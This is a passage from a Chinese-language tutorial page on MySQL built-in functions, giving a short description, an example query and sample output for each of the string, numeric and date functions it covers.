SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| M*y                                |</span><br><span class="line">+------------------------------------+</span><br><span class="line"> SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| S*Q*L                               |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2);</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| S*Q                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><p><strong>1.ABS(x)</strong></p><p> 返回 x 的绝对值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ABS(-1);</span><br><span class="line">+---------+</span><br><span class="line">| ABS(-1) |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.AVG(expression)</strong></p><p>返回一个表达式的平均值，expression 是一个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT AVG(Price) AS AveragePrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| AveragePrice |</span><br><span class="line">+--------------+</span><br><span class="line">|     456.0000 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>3.三角函数(参数x是弧度)</strong></p><p>SIN(x) | COS(x) | TAN(x) | COT(x) | ASIN(x) | ACOS(x) | ATAN(x) </p><p><strong>4.DEGREES(x)</strong></p><p>将弧度转换为角度　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEGREES(3.1415926535898) ;</span><br><span class="line">+--------------------------+</span><br><span class="line">| DEGREES(3.1415926535898) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|        180.0000000000004 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.CEIL(x)</strong></p><p>返回大于或等于 x 的最小整数　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CEIL (0.1);</span><br><span class="line">+------------+</span><br><span class="line">| CEIL (0.1) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>6.FLOOR(x)</strong></p><p>返回小于或等于 x 的最大整数　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FLOOR(-0.1);</span><br><span class="line">+-------------+</span><br><span class="line">| FLOOR(-0.1) |</span><br><span class="line">+-------------+</span><br><span class="line">|          -1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>7.COUNT(expression)</strong></p><p>返回查询的记录总数，expression 参数是一个字段或者 * 号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(User) AS User_number FROM user;</span><br><span class="line">+-------------+</span><br><span class="line">| User_number |</span><br><span class="line">+-------------+</span><br><span class="line">|           6 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>8.n DIV m</strong></p><p>整除，n 为被除数，m 为除数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT 10 DIV 5;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 5 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>9.MOD(x,y)</strong></p><p>返回 x 除以 y 以后的余数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MOD(5,2);</span><br><span class="line">+----------+</span><br><span class="line">| MOD(5,2) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>10.EXP(x)</strong></p><p>返回 e 的 x 次方　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(3) ;</span><br><span class="line">+--------------------+</span><br><span class="line">| EXP(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>11.GREATEST(expr1, expr2, expr3, …)</strong></p><p>返回列表中的最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT GREATEST(3, 12, 34, 8, 25);</span><br><span class="line">+----------------------------+</span><br><span class="line">| GREATEST(3, 12, 34, 8, 25) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                         34 |</span><br><span class="line">+----------------------------+</span><br><span class="line">SELECT GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| Oracle                               |</span><br><span class="line">+--------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.LEAST(expr1, expr2, expr3, …)</strong></p><p>返回列表中的最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEAST(3, 12, 34, 8, 25);</span><br><span class="line">+-------------------------+</span><br><span class="line">| LEAST(3, 12, 34, 8, 25) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       3 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.MAX(expression)</strong></p><p>返回字段 expression 中的最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MAX(Price) AS LargestPrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| LargestPrice |</span><br><span class="line">+--------------+</span><br><span class="line">|          789 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.MIN(expression)</strong></p><p>返回字段 expression 中的最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MIN(Price) AS MinPrice FROM Products;</span><br><span class="line">+----------+</span><br><span class="line">| MinPrice |</span><br><span class="line">+----------+</span><br><span class="line">|      123 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>15.对数计算</strong></p><p>LOG(x)  返回数字的自然对数，以 e 为底。</p><p>LOG(n, x)  返回以n为底，数字x的对数。</p><p>LOG2(x)  返回以 2 为底的对数。</p><p>LOG10(x)   返回以 10 为底的对数。</p><p><strong>16.PI()</strong></p><p>返回圆周率(3.141593）</p><p><strong>17.POW(x,y)  | POWER(x,y)</strong></p><p>返回 x 的 y 次方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT POW (2,3);</span><br><span class="line">+-----------+</span><br><span class="line">| POW (2,3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         8 |</span><br><span class="line">+-----------+</span><br><span class="line">SELECT POWER(2,3);</span><br><span class="line">+------------+</span><br><span class="line">| POWER(2,3) |</span><br><span class="line">+------------+</span><br><span class="line">|          8 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>18.RADIANS(x)</strong></p><p>将角度转换为弧度　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RADIANS(180);</span><br><span class="line">+-------------------+</span><br><span class="line">| RADIANS(180)      |</span><br><span class="line">+-------------------+</span><br><span class="line">| 3.141592653589793 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>19.RAND()</strong></p><p>返回 0 到 1 的随机数　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RAND();</span><br><span class="line">+--------------------+</span><br><span class="line">| RAND()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.8029554586885083 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>20.ROUND(x)</strong></p><p>返回离 x 最近的整数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ROUND(1.49999999999);</span><br><span class="line">+----------------------+</span><br><span class="line">| ROUND(1.49999999999) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT ROUND(1.5);</span><br><span class="line">+------------+</span><br><span class="line">| ROUND(1.5) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>21.SIGN(x)</strong></p><p>返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SIGN(-1);</span><br><span class="line">+----------+</span><br><span class="line">| SIGN(-1) |</span><br><span class="line">+----------+</span><br><span class="line">|       -1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>22.SQRT(x)</strong></p><p>返回x的平方根　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SQRT(4);</span><br><span class="line">+---------+</span><br><span class="line">| SQRT(4) |</span><br><span class="line">+---------+</span><br><span class="line">|       2 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>23.SUM(expression)</strong></p><p>返回指定字段的总和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(Price) FROM Products;</span><br><span class="line">+------------+</span><br><span class="line">| SUM(Price) |</span><br><span class="line">+------------+</span><br><span class="line">|       1368 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>24.TRUNCATE(x,y)</strong></p><p>返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRUNCATE(1.23456,3);</span><br><span class="line">+---------------------+</span><br><span class="line">| TRUNCATE(1.23456,3) |</span><br><span class="line">+---------------------+</span><br><span class="line">|               1.234 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-日期函数"><a href="#MySQL-日期函数" class="headerlink" title="MySQL 日期函数"></a>MySQL 日期函数</h2><p><strong>1.ADDDATE(d,n)</strong></p><p> 计算起始日期 d 加上 n 天的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDDATE(&#39;2020-2-1&#39;,30);</span><br><span class="line">+------------------------+</span><br><span class="line">| ADDDATE(&#39;2020-2-1&#39;,30) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 2020-03-02             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>2.ADDTIME(t,n)</strong></p><p>n 是一个时间表达式，时间 t 加上时间表达式 n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| 2020-11-11 00:00:00                    |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.DATE_ADD(d，INTERVAL expr type)</strong></p><p>计算起始日期 d 加上一个时间段后的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE);</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE) |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| 2020-11-11 11:16:11                                |</span><br><span class="line">+----------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.当前日期时间</strong></p><p>CURDATE()  |   CURRENT_DATE()   返回当前日期</p><p>CURTIME()  |    CURRENT_TIME     返回当前时间</p><p>NOW()  |  CURRENT_TIMESTAMP()  |  LOCALTIME()  |LOCALTIMESTAMP()   |  SYSDATE()  返回当前日期和时间</p><p><strong>5.DATE(t)  |  HOUR(t)  |  MINUTE(t)  |SECOND(t)</strong></p><p>从日期或日期时间表达式中提取日期值|小时值|分钟值|秒钟值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE(&#39;2020-11-11 0:0:0&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DATE(&#39;2020-11-11 0:0:0&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| 2020-11-11               |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.DATEDIFF(d1,d2)</strong></p><p>计算日期 d1-&gt;d2 之间相隔的天数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                              -197 |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.DATE_FORMAT(d,f)</strong></p><p> 按表达式 f的要求显示日期 d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| 2011-11-11 11:11:11 AM                           |</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.DATE_SUB(date,INTERVAL expr type)</strong></p><p>函数从日期减去指定的时间间隔。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> select * from Orders;</span><br><span class="line">+---------+------------+</span><br><span class="line">| OrderId | OrderDate  |</span><br><span class="line">+---------+------------+</span><br><span class="line">|       1 | 2020-11-11 |</span><br><span class="line">+---------+------------+</span><br><span class="line">SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders;</span><br><span class="line">+---------+--------------+</span><br><span class="line">| OrderId | OrderPayDate |</span><br><span class="line">+---------+--------------+</span><br><span class="line">|       1 | 2020-11-09   |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure><p><strong>9.DAY(d)</strong></p><p>返回日期值 d 的日期部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DAY(&#39;2020-11-11&#39;) AS day;</span><br><span class="line">+------+</span><br><span class="line">| day  |</span><br><span class="line">+------+</span><br><span class="line">|   11 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>10.DAYNAME(d)</strong></p><p>返回日期 d 是星期几，如 Monday,Tuesday</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| DAYNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Wednesday             |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>11.DAYOFYEAR(d)</strong></p><p> 计算日期 d 是本年的第几天</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYOFYEAR (&#39;2020-11-11&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DAYOFYEAR (&#39;2020-11-11&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                      316 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.EXTRACT(type FROM d)</strong></p><p>从日期 d 中获取指定的值，type 指定返回的值。<br>type可取值为：</p><ul><li>MICROSECOND</li><li>SECOND</li><li>MINUTE</li><li>HOUR</li><li>DAY</li><li>WEEK</li><li>MONTH</li><li>QUARTER</li><li>YEAR</li><li>SECOND_MICROSECOND</li><li>MINUTE_MICROSECOND</li><li>MINUTE_SECOND</li><li>HOUR_MICROSECOND</li><li>HOUR_SECOND</li><li>HOUR_MINUTE</li><li>DAY_MICROSECOND</li><li>DAY_SECOND</li><li>DAY_MINUTE</li><li>DAY_HOUR</li><li>YEAR_MONTH</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                         11 |</span><br><span class="line">+--------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.FROM_DAYS(n)</strong></p><p>计算从 0000 年 1 月 1 日开始 n 天后的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FROM_DAYS(9999);</span><br><span class="line">+-----------------+</span><br><span class="line">| FROM_DAYS(9999) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 0027-05-18      |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>14.TO_DAYS(d)</strong></p><p>计算日期 d 距离 0000 年 1 月 1 日的天数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TO_DAYS(&#39;0027-05-18&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| TO_DAYS(&#39;0027-05-18&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                  9999 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LAST_DAY(d)</strong></p><p>返回给定日期的那一月份的最后一天</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LAST_DAY(&#39;2020-2-1&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| LAST_DAY(&#39;2020-2-1&#39;) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2020-02-29           |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>16.MAKEDATE(year, day-of-year)</strong></p><p>基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKEDATE(2020,300);</span><br><span class="line">+--------------------+</span><br><span class="line">| MAKEDATE(2020,300) |</span><br><span class="line">+--------------------+</span><br><span class="line">| 2020-10-26         |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>17.MAKETIME(hour, minute, second)</strong></p><p>组合时间，参数分别为小时、分钟、秒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKETIME(1,2,3);</span><br><span class="line">+-----------------+</span><br><span class="line">| MAKETIME(1,2,3) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 01:02:03        |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>18.MONTHNAME(d)</strong></p><p>返回日期当中的月份名称，如 November</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MONTHNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| MONTHNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| November                |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>19.PERIOD_ADD(period, number)</strong></p><p>为 年-月 组合日期添加一个时段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT PERIOD_ADD(202011,7);</span><br><span class="line">+----------------------+</span><br><span class="line">| PERIOD_ADD(202011,7) |</span><br><span class="line">+----------------------+</span><br><span class="line">|               202106 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>20.PERIOD_DIFF(period1, period2)</strong></p><p>返回两个时段之间的月份差值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT PERIOD_DIFF(202011,202109);</span><br><span class="line">+----------------------------+</span><br><span class="line">| PERIOD_DIFF(202011,202109) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                        -10 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.TIMEDIFF(time1, time2)</strong></p><p>计算时间差值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| -03:03:03                 |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>22.QUARTER(d)</strong></p><p>返回日期d是第几季节，返回 1 到 4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT QUARTER(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| QUARTER(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     4 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>23.SEC_TO_TIME(s)</strong></p><p>将以秒为单位的时间 s 转换为时分秒的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SEC_TO_TIME(9999);</span><br><span class="line">+-------------------+</span><br><span class="line">| SEC_TO_TIME(9999) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 02:46:39          |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>24.TIME_TO_SEC(t)</strong></p><p>将时间 t 